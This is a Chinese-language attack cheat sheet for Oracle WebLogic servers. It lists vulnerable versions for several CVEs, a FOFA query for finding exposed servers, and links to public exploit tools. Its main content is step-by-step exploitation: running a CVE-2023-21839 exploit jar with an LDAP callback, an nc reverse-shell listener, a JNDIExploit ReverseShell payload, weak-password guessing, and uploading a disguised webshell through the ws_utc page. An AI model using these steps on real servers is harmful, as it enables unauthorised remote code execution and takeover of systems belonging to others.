Weblogic是Oracle公司推出的J2EE（java web）应用服务器

默认端口：7001

### 反序列化（CVE-2020-2555/2551）/(CVE-2017-10271)

##### 版本：

- Oracle Coherence 3.7.1.17
- Oracle Coherence 12.1.3.0.0
- Oracle Coherence 12.2.1.3.0
- Oracle Coherence 12.2.1.4.0

##### 利用：

[漏洞复现：WebLogic反序列化远程代码执行漏洞(cve-2020-2555)-CSDN博客](https://blog.csdn.net/HCIEMAYU/article/details/131772020)

直接用天狐渗透工具箱里的weblogic工具扫目标，扫出来用就行

1.

### 远程代码执行（CVE-2023-21839）

##### 版本：

12.2.1.2.0
12.2.1.1.0
12.2.1.3.0
12.2.1.0.0
12.2.1.4.0
14.1.1.0.0
12.1.2.0.0
12.1.3.0.0
10.3.6.0

FOFA查询：[app=“BEA-WebLogic-Server” ||app=“Weblogic_interface_7001”]

##### 利用：

[Weblogic CVE 2023-21839漏洞复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/364212.html)

EXP链接：https：//github.com/DXask88MA/Weblogic-CVE-2023-21839

需要使用JNDIExploit-1.4-SNAPSHOT.jar工具启动ladp服务

下载链接：https://github.com/WhiteHSBG/JNDIExploit

------

1.攻击机1上执行命令

java -jar Weblogic-CVE-2023-21839.jar 目标网址:端口 ldap://m08q4j.dnslog.cn/test
执行以上命令可以在dnslog上获得回显，即可验证可能存在该漏洞

2.攻击机1上执行命令

nc -lvp 2000 启动反弹shell监听

3.下载后需要在服务器C搭建ldap服务，其实就是启动上边那个jar包

java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 服务器Cip

4.启动完成后还需进行端口监听，服务器C直接启动nc进行监听

5.此时使用攻击机1执行exp

java -jar Weblogic-CVE-2023-21839.jar 靶场 IP：7001 ldap://ldap 服务器IP：1389/Basic/ReverseShell/ldap服务器IP/nc监听端口

6.此时查看ldap服务器C，成功反弹shell

### 弱口令

http://your-ip:7001/console 即可进入后台，由于管理员的疏忽，有可能会设置一些弱口令，攻击者可以通过常见的口令猜解进入后台，再通过后台getshell。

### 任意文件上传（CVE-2018-2894）

##### 版本：

Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。

##### 利用

[Weblogic 任意文件上传漏洞（CVE-2018-2894）复现-CSDN博客](https://blog.csdn.net/weixin_51198941/article/details/134193310)

1.访问http://your-ip:7001/console，即可看到后台登录页面

2.去靶场看看后台账户密码，命令：

```
docker-compose logs | grep password
```

3.成功登录进去，点击base_domain可看到设置页面，然后点击高级，勾选启用Web服务测试页

4.访问漏洞页面http://your-ip:7001/ws_utc/config.do，并设置其中Work Home Dir

为：/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
5.然后在点击安全-提交Keystore文件-上传图片马

6.提交图片马时抓包，拦截响应包，复制其中的时间戳（<id> 时间戳</id>）

7.访问http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可成功执行webshell	
